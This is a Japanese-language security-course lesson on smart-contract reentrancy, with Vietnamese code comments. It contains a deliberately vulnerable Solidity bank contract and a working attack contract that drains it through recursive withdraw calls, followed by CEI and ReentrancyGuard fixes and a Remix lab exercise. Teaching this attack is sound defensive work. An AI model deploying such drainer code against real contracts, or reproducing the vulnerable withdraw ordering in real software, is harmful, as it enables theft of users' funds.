---
title: "Day 18: 再入攻撃（Reentrancy Attack）と防御的プログラミング"
description: "ブロックチェーン史上最も古典的で有名な脆弱性を徹底解説。The DAOがどのように攻撃されたかを学び、再入攻撃をシミュレートするコードを実装し、CEI防御パターンのマスターを目指します。"
---

# Day 18: 再入攻撃（Reentrancy Attack）と防御的プログラミング

18日目へようこそ！私たちはついに、本コースの最終章であり、最もエキサイティングなパートである **『Web3セキュリティの極意とスマートコントラクト監査（Smart Contract Audit）』** に正式に入ります。

ブロックチェーンの世界において、セキュリティは輝かしい成功と完全な破滅を分ける極めて細い境界線です。本日は、ブロックチェーン史上最も古典的で、有名かつ危険なセキュリティ脆弱性である**再入攻撃（Reentrancy Attack）**について学んでいきます。

2016年、**The DAO**プロジェクトを標的にしたReentrancy攻撃により、**360万ETH**（当時のイーサリアム総供給量の15%以上）が盗まれました。これにより、イーサリアムネットワークは歴史的な分岐（ハードフォーク）を余儀なくされ、現在のEthereum（ETH）とEthereum Classic（ETC）という2つの独立したネットワークに分裂することになりました。

この攻撃の技術的な本質を分析し、プロジェクトの資産を守るための絶対的な防衛線を構築する方法を学びましょう。

---

## 1. Reentrancy（再入）の技術的本質

再入脆弱性は、スマートコントラクトが自身の残高記録（帳簿）を更新する**前**に、外部のアドレスに資金（ETHやトークン）を送金するときに発生します。

### 「無限引き出し」のシナリオ：
あなたが従来の銀行に行って、口座残高である1,000万円を全額引き出そうとする様子を想像してみてください。
1.  あなたが引き出しを要求します。
2.  窓口担当者があなたに1,000万円を渡します。
3.  **担当者が**コンピュータのキーボードを叩いてあなたの口座残高を0に更新する**前**に、あなたはすかさずこう叫びます：*「もう一度1,000万円を引き出したい！」*
4.  担当者がコンピュータの画面を見ると、残高はまだ1,000万円のままなので、再びあなたに現金を渡します。
5.  このサイクルが、銀行の金庫が空っぽになるまで繰り返されます！

Solidityにおいて、コントラクトがハッカーのスマートコントラクトアドレスに対して `.call{value: amount}("")` を使ってETHを送信すると、EVM（イーサリアム仮想マシン）は銀行コントラクトの実行を**一時停止**し、ハッカーのコントラクトの受取関数（`receive()` または `fallback()`）に**制御権を譲渡**します。

この制御権を悪用して、ハッカーのコントラクトは、自身の残高がまだ差し引かれていない状態で、即座に銀行の引き出し関数を**コールバック**（再入：re-enter）し、次の引き出しを実行します！

---

## 2. 実装コードによるReentrancy攻撃のシミュレーション

脆弱性のある銀行コントラクト `VulnerableBank` と、ハッカーの悪意あるコントラクト `Attack` を実際にコーディングし、攻撃がどのように行われるかを明確に確認しましょう。

### 2.1. 脆弱性のある銀行コントラクト（`VulnerableBank.sol`）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    // HÀM RÚT TIỀN BỊ LỖI BẢO MẬT NGHIÊM TRỌNG!
    function withdraw() public {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "So du bang 0!");

        // 1. Thực hiện chuyển ETH đi trước (Nhường quyền điều khiển cho người nhận)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Chuyen tien that bai!");

        // 2. Cập nhật lại số dư sau (Lệnh này sẽ KHÔNG bao giờ được chạy đến 
        // cho đến khi hacker hoàn tất việc rút sạch tiền)
        balanceOf[msg.sender] = 0;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

---

### 2.2. ハッカーの悪意ある攻撃用コントラクト（`Attack.sol`）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Hàm nhận tiền tự động kích hoạt khi VulnerableBank chuyển ETH về
    receive() external payable {
        // Nếu số dư của ngân hàng vẫn lớn hơn hoặc bằng 1 ETH
        if (address(bank).balance >= 1 ether) {
            // TÁI NHẬP: Gọi lại hàm withdraw để cướp tiếp tiền!
            bank.withdraw();
        }
    }

    // Kích hoạt cuộc tấn công
    function attack() public payable {
        require(msg.value == 1 ether, "Yeu cau gui dung 1 ETH de tan cong!");
        
        // 1. Nạp 1 ETH vào ngân hàng để tạo uy tín
        bank.deposit{value: 1 ether}();
        
        // 2. Kích hoạt lượt rút tiền đầu tiên
        bank.withdraw();
    }

    // Rút toàn bộ số tiền cướp được về ví của Hacker
    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Khong phai hacker owner!");
        payable(owner).transfer(address(this).balance);
    }
}
```

---

## 3. 絶対的な防御策

Reentrancy攻撃からスマートコントラクトを保護するために、2つの究極の武器（対策）があります。

### 3.1. Checks-Effects-Interactions（CEI）パターン
これはSolidityにおけるすべての関数で推奨される必須の設計標準です。常に以下の規則に従ってコードの実行順序を整理してください：
1.  **Checks（検証）：** 入力条件を検証するために、すべての `require` や `if-revert` などのステートメントを実行します。
2.  **Effects（状態の更新）：** コントラクト内のすべての状態変数や帳簿の残高を**先に**更新します。
3.  **Interactions（外部との相互作用）：** 最後に、他のコントラクトの呼び出しや送金を実行します。

#### 引き出し関数のバグを修正するためにCEIを適用する：
```solidity
function withdrawSafe() public {
    // 1. Checks
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "So du bang 0!");

    // 2. Effects (Cập nhật sổ sách trước!)
    balanceOf[msg.sender] = 0;

    // 3. Interactions (Chuyển tiền sau cùng)
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Chuyen tien that bai!");
}
```
*ステップ2でハッカーの残高はすでに0に更新されているため、ハッカーのコントラクトが2回目に `withdrawSafe` 関数を呼び出そうとしても（再入）、その時点の `balanceOf` は0であるため、ステップ1で即座にブロックされます！*

### 3.2. OpenZeppelinの `ReentrancyGuard` の使用
コントラクトのロジックが複雑すぎてCEIパターンの適用が困難な場合は、**`ReentrancyGuard`** ライブラリを継承し、重要な関数に **`nonReentrant`** モディファイアを追加することができます。

このモディファイアは、シンプルなドアの鍵のように機能します。関数の開始時にドアをロック（`lock = true`）します。ロックが閉じている間に関数への再入が試みられた場合、トランザクションは即座に自動的にロールバック（revert）されます。関数全体の処理が完了すると、ロックは解除されます。

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    // Thêm modifier nonReentrant để chống tái nhập tuyệt đối
    function withdraw(uint256 _amount) public nonReentrant {
        require(balanceOf[msg.sender] >= _amount, "Khong du so du!");
        
        balanceOf[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}
```

---

## 18日目のまとめ

本日、あなたはDeFiの世界における最大の脅威を徹底的に分析することに成功しました：
1.  **再入攻撃（Reentrancy Attack）**の本質と、EVM（イーサリアム仮想マシン）における制御権の移転フローを理解しました。
2.  `VulnerableBank` と `Attack` という2つのコントラクト間の実際の攻撃を、自身のコードでシミュレートしました。
3.  防御的プログラミングの最高峰の哲学である **Checks-Effects-Interactions（CEI）ルール**をマスターしました。
4.  絶対的な保護バリアを構築するために、OpenZeppelinの **`ReentrancyGuard`** を統合する方法を学びました。

**実習課題：**
Remix IDEを開き、以下の模擬攻撃手順を実行してみましょう：
1. `VulnerableBank` コントラクトをデプロイします。
2. 3つの異なる通常のウォレットアカウントを使用して、この銀行に合計 `10 ETH` を入金（deposit）します。
3. `Attack` コントラクトをデプロイし、コンストラクタの引数に `VulnerableBank` のアドレスを渡します。
4. ハッカーのアカウントを使用して、ちょうど `1 ETH` を送信しながら `attack` 関数を呼び出します。
5. `Attack` コントラクトと `VulnerableBank` コントラクトの残高を確認します。驚くべき光景を目にするでしょう：銀行コントラクトから、ハッカーのウォレットへと合計 `11 ETH` がすべて引き出されています！
6. 銀行のコードを **CEI** ルールに従って書き直すか、`nonReentrant` を追加して再実行し、ハッカーが資金を盗み出す機会が完全になくなったことを確認します。

明日は、数学的ロジックエラーと権限管理に関連する、非常に巧妙な2つのセキュリティ脆弱性である **オーバーフロー/アンダーフロー（Overflow/Underflow）** と **不適切な権限管理** について学習します。それでは、また明日お会いしましょう！
